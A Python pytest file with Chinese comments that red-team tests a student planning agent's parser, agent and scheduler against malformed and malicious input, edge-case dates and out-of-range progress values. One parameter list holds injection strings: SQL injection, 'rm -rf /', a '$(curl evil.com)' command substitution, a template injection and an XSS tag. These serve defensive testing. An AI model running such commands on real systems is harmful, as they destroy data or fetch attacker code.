"""红队测试：恶意输入、边界条件、鲁棒性验证。

目标：确保系统在异常/恶意输入下不崩溃、不抛出未处理异常、
      不产生数据一致性问题。
"""
import sys
from pathlib import Path
from datetime import datetime, timedelta

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import pytest

from lifeops.models import StudentProfile
from lifeops.agent import LifeAgent, InputParser
from lifeops.agent.parser import ParseIntent


@pytest.fixture
def profile():
    return StudentProfile(name="红队测试", daily_high_energy_hours=4)


@pytest.fixture
def parser():
    return InputParser()  # Mock 模式


@pytest.fixture
def agent(profile):
    return LifeAgent(profile=profile)


@pytest.fixture
def now():
    return datetime(2026, 9, 13, 9, 0, 0)


# ==========================================
# 1. 输入解析器：恶意输入不崩溃
# ==========================================

class TestParserRedTeam:
    """解析器对恶意/异常输入的鲁棒性。"""

    @pytest.mark.parametrize("malicious", [
        "'; DROP TABLE goals; --",          # SQL 注入
        "' OR '1'='1",                      # SQL 注入
        "rm -rf /",                         # 命令注入
        "$(curl evil.com)",                 # 命令注入
        "`whoami`",                         # 命令注入
        "{{7*7}}",                          # 模板注入
        "<script>alert(1)</script>",        # XSS
    ])
    def test_malicious_input_does_not_crash(self, parser, malicious):
        """恶意输入不应导致解析器崩溃或执行注入。"""
        result = parser.parse(malicious)
        # 必须返回 ParseResult，不能抛异常
        assert result.intent is not None
        # 恶意输入不应被当成有效目标/事件执行
        assert result.intent not in (ParseIntent.NEW_GOAL, ParseIntent.NEW_EVENT)

    def test_empty_input(self, parser):
        """空字符串输入应安全返回 unknown，不崩溃。"""
        result = parser.parse("")
        assert result.intent == ParseIntent.UNKNOWN

    def test_whitespace_only_input(self, parser):
        """纯空白输入应安全返回。"""
        result = parser.parse("   \n\t  ")
        assert result.intent == ParseIntent.UNKNOWN

    def test_very_long_input(self, parser):
        """超长输入（10000 字符）不应导致超时或崩溃。"""
        long_msg = "我要准备高数考试" * 2000  # ~14000 字符
        result = parser.parse(long_msg, now=datetime(2026, 9, 13))
        # 不管解析成什么，不能抛异常
        assert result.intent is not None

    def test_special_characters(self, parser):
        """特殊字符（emoji、控制字符）不应崩溃。"""
        result = parser.parse("我要🤔准备💀高数考试📚")
        assert result.intent is not None

    def test_null_bytes(self, parser):
        """含 null 字节的输入不应崩溃。"""
        result = parser.parse("我要准备\x00高数考试")
        assert result.intent is not None

    def test_contradictory_progress(self, parser):
        """矛盾的进度表述（如"完成了-10%"）不应崩溃。"""
        result = parser.parse("我完成了-10%")
        # 进度不能为负，解析后不应产生负数进度
        for record in result.execution_records:
            assert record.progress_delta >= 0


# ==========================================
# 2. 日期解析边界
# ==========================================

class TestDateParsingRedTeam:
    """日期解析的边界条件。"""

    def test_far_future_date(self, parser):
        """极远未来日期（9999年）应能解析，不崩溃。"""
        result = parser.parse(
            "9999年12月31日我要参加考试",
            now=datetime(2026, 9, 13),
        )
        # 不应崩溃，结果应为 new_goal 或 unknown
        assert result.intent is not None

    def test_invalid_date(self, parser):
        """无效日期（2月30日）不应崩溃。"""
        result = parser.parse(
            "2月30日我要交作业",
            now=datetime(2026, 2, 15),
        )
        assert result.intent is not None

    def test_negative_year(self, parser):
        """公元前日期不应崩溃。"""
        result = parser.parse(
            "公元前100年我要复习",
            now=datetime(2026, 9, 13),
        )
        assert result.intent is not None


# ==========================================
# 3. Agent 边界输入
# ==========================================

class TestAgentRedTeam:
    """Agent 对边界输入的鲁棒性。"""

    def test_empty_message(self, agent, now):
        """空消息不应崩溃，应返回 unknown。"""
        result = agent.run("", now=now)
        assert result is not None
        assert result.intent == ParseIntent.UNKNOWN

    def test_malicious_message(self, agent, now):
        """恶意消息不应崩溃或破坏内部状态。"""
        goals_before = len(agent._goals)
        result = agent.run("'; DROP TABLE goals; --", now=now)
        assert result is not None
        # 内部状态不应被破坏
        assert len(agent._goals) == goals_before

    def test_cancel_nonexistent_goal(self, agent, now):
        """取消不存在的目标应安全提示，不崩溃。"""
        result = agent.run("取消不存在的目标xyz", now=now)
        assert result is not None
        assert not result.changed
        # 不应误删任何东西
        assert len(agent._goals) == 0

    def test_cancel_with_empty_keyword(self, agent, now):
        """取消但没说清哪个（关键词为空）应安全提示。"""
        agent.run("我要准备高数考试", now=now)
        result = agent.run("取消计划", now=now + timedelta(hours=1))
        assert result is not None
        # 有目标时应进入确认或给出提示，不应崩溃
        assert result.intent == ParseIntent.CANCEL_PLAN

    def test_progress_out_of_range_high(self, agent, now):
        """进度 > 1（如 150%）应被钳制到 1.0，不崩溃。"""
        agent.run("我要准备高数考试", now=now)
        result = agent.run("我完成了150%", now=now + timedelta(hours=1))
        assert result is not None
        # 所有任务进度不应超过 1.0
        for t in agent._tasks:
            assert t.progress <= 1.0

    def test_progress_negative(self, agent, now):
        """负进度应被钳制到 0，不崩溃。"""
        agent.run("我要准备高数考试", now=now)
        result = agent.run("我完成了-50%", now=now + timedelta(hours=1))
        assert result is not None
        for t in agent._tasks:
            assert t.progress >= 0.0

    def test_repeated_rapid_cancel_confirm(self, agent, now):
        """快速连续取消-确认-取消不应导致状态不一致。"""
        agent.run("我要准备高数考试", now=now)
        initial_goals = len(agent._goals)

        # 取消
        agent.run("取消备考计划", now=now + timedelta(hours=1))
        # 否定
        agent.run("不用了", now=now + timedelta(hours=2))
        # 目标应保留
        assert len(agent._goals) == initial_goals

        # 再次取消并确认
        agent.run("取消备考计划", now=now + timedelta(hours=3))
        agent.run("可以", now=now + timedelta(hours=4))
        # 目标应被删除
        assert len(agent._goals) == 0

    def test_concurrent_like_rapid_inputs(self, agent, now):
        """短时间内大量输入不应导致状态损坏。"""
        agent.run("我要准备高数考试", now=now)
        for i in range(10):
            agent.run(f"我完成了{i*5}%", now=now + timedelta(minutes=i))
        # 不应崩溃，任务进度应在合法范围
        for t in agent._tasks:
            assert 0.0 <= t.progress <= 1.0


# ==========================================
# 4. 调度器边界
# ==========================================

class TestSchedulerRedTeam:
    """调度器在极端任务配置下的鲁棒性。"""

    def test_zero_minutes_task(self, agent, now):
        """0 分钟任务不应导致除零错误或无限循环。"""
        from lifeops.models import Task, DeadlineType, EnergyLevel
        agent.add_task(Task(
            title="零时长任务",
            goal_id="g1",
            estimated_minutes=0,
            deadline_type=DeadlineType.SOFT,
            energy_level=EnergyLevel.MEDIUM,
        ))
        result = agent.force_replan(reason="测试零时长", now=now)
        assert result is not None

    def test_huge_task(self, agent, now):
        """超大时长任务（10000 分钟）不应导致调度器崩溃。"""
        from lifeops.models import Task, DeadlineType, EnergyLevel
        agent.add_task(Task(
            title="超大任务",
            goal_id="g1",
            estimated_minutes=100000,
            deadline_type=DeadlineType.SOFT,
            energy_level=EnergyLevel.HIGH,
        ))
        result = agent.force_replan(reason="测试超大任务", now=now)
        assert result is not None


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
